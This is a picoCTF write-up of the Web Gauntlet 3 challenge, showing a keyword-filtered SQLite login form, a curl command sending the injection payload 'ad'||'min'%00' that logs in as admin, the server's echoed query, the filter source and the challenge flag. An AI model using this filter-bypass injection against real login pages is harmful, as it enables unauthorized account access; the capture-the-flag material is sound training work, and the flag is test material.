# picoGym Level 128: Web Gauntlet 3
Source: https://play.picoctf.org/practice/challenge/128

## Goal
Last time, I promise! Only 25 characters this time. Log in as admin<br>
Site: http://mercury.picoctf.net:28715/<br>
Filter: http://mercury.picoctf.net:28715/filter.php

## What I learned
```
Same as Web Gauntlet 2

--output -
        instead of -o filename
        write output to stdout
```

## Solution
```
https://webshell.picoctf.org/

Browser: http://mercury.picoctf.net:28715/filter.php ⌨️
Filters: or and true false union like = > < ; -- /* */ admin

Browser: http://mercury.picoctf.net:28715/ ⌨️
# View Page Source

<!DOCTYPE html>
<html>
<head>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link href="style.css" rel="stylesheet">
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</head>
	<body>
		<div class="container">
			<div class="row">
				<div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
					<div class="card card-signin my-5">
						<div class="card-body">
							<h5 class="card-title text-center">Filtered SQLite Injection Challenge #3</h5>
														<form class="form-signin" action="index.php" method="post">
								<div class="form-label-group">
									<input type="text" id="user" name="user" class="form-control" placeholder="Username" required autofocus>
									<label for="user">Username</label>
								</div>

								<div class="form-label-group">
									<input type="password" id="pass" name="pass" class="form-control" placeholder="Password" required>
									<label for="pass">Password</label>
								</div>

								<button class="btn btn-lg btn-primary btn-block text-uppercase" type="submit">Sign in</button>
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>
	</body>
</html>


AsianHacker-picoctf@webshell:~$ curl --data "user=ad'||'min'%00&pass=a" http://mercury.picoctf.net:28715/index.php --cookie "PHPSESSID=mtchfmpb73v4i9hvdnu0o1956u" --output - ⌨️
SELECT username, password FROM users WHERE username='ad'||'min'' AND password='a'<!DOCTYPE html>
<html>
<head>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link href="style.css" rel="stylesheet">
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</head>
        <body>
                <div class="container">
                        <div class="row">
                                <div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
                                        <div class="card card-signin my-5">
                                                <div class="card-body">
                                                        <h5 class="card-title text-center">Filtered SQLite Injection Challenge #3</h5>
                                                        <h6 class="text-center" style="color:green">Congrats! You won! Check out filter.php</h6> 👀                                                        <form class="form-signin" action="index.php" method="post">
                                                                <div class="form-label-group">
                                                                        <input type="text" id="user" name="user" class="form-control" placeholder="Username" required autofocus>
                                                                        <label for="user">Username</label>
                                                                </div>

                                                                <div class="form-label-group">
                                                                        <input type="password" id="pass" name="pass" class="form-control" placeholder="Password" required>
                                                                        <label for="pass">Password</label>
                                                                </div>

                                                                <button class="btn btn-lg btn-primary btn-block text-uppercase" type="submit">Sign in</button>
                                                        </form>
                                                </div>
                                        </div>
                                </div>
                        </div>
                </div>
        </body>
</html>

AsianHacker-picoctf@webshell:~$ curl http://mercury.picoctf.net:28715/filter.php --cookie "PHPSESSID=mtchfmpb73v4i9hvdnu0o1956u" ⌨️
<code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br />session_start</span><span style="color: #007700">();<br /><br />if&nbsp;(!isset(</span><span style="color: #0000BB">$_SESSION</span><span style="color: #007700">[</span><span style="color: #DD0000">"winner3"</span><span style="color: #007700">]))&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_SESSION</span><span style="color: #007700">[</span><span style="color: #DD0000">"winner3"</span><span style="color: #007700">]&nbsp;=&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">;<br />}<br /></span><span style="color: #0000BB">$win&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">$_SESSION</span><span style="color: #007700">[</span><span style="color: #DD0000">"winner3"</span><span style="color: #007700">];<br /></span><span style="color: #0000BB">$view&nbsp;</span><span style="color: #007700">=&nbsp;(</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">[</span><span style="color: #DD0000">"PHP_SELF"</span><span style="color: #007700">]&nbsp;==&nbsp;</span><span style="color: #DD0000">"/filter.php"</span><span style="color: #007700">);<br /><br />if&nbsp;(</span><span style="color: #0000BB">$win&nbsp;</span><span style="color: #007700">===&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$filter&nbsp;</span><span style="color: #007700">=&nbsp;array(</span><span style="color: #DD0000">"or"</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"and"</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"true"</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"false"</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"union"</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"like"</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"="</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"&gt;"</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"&lt;"</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">";"</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"--"</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"/*"</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"*/"</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"admin"</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(</span><span style="color: #0000BB">$view</span><span style="color: #007700">)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"Filters:&nbsp;"</span><span style="color: #007700">.</span><span style="color: #0000BB">implode</span><span style="color: #007700">(</span><span style="color: #DD0000">"&nbsp;"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$filter</span><span style="color: #007700">).</span><span style="color: #DD0000">"&lt;br/&gt;"</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />}&nbsp;else&nbsp;if&nbsp;(</span><span style="color: #0000BB">$win&nbsp;</span><span style="color: #007700">===&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(</span><span style="color: #0000BB">$view</span><span style="color: #007700">)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">highlight_file</span><span style="color: #007700">(</span><span style="color: #DD0000">"filter.php"</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_SESSION</span><span style="color: #007700">[</span><span style="color: #DD0000">"winner3"</span><span style="color: #007700">]&nbsp;=&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #FF8000">//&nbsp;&lt;-&nbsp;Don't&nbsp;refresh!<br /></span><span style="color: #007700">}&nbsp;else&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_SESSION</span><span style="color: #007700">[</span><span style="color: #DD0000">"winner3"</span><span style="color: #007700">]&nbsp;=&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">;<br />}<br /><br /></span><span style="color: #FF8000">//&nbsp;picoCTF{k3ep_1t_sh0rt_2a78ea34c84da0bf585ada4cb9a6f8fb}🔐<br /></span><span style="color: #0000BB">?&gt;<br /></span>
</span>
```

## Flag
picoCTF{k3ep_1t_sh0rt_2a78ea34c84da0bf585ada4cb9a6f8fb}

## Continue
[Continue](./picoGym0356.md)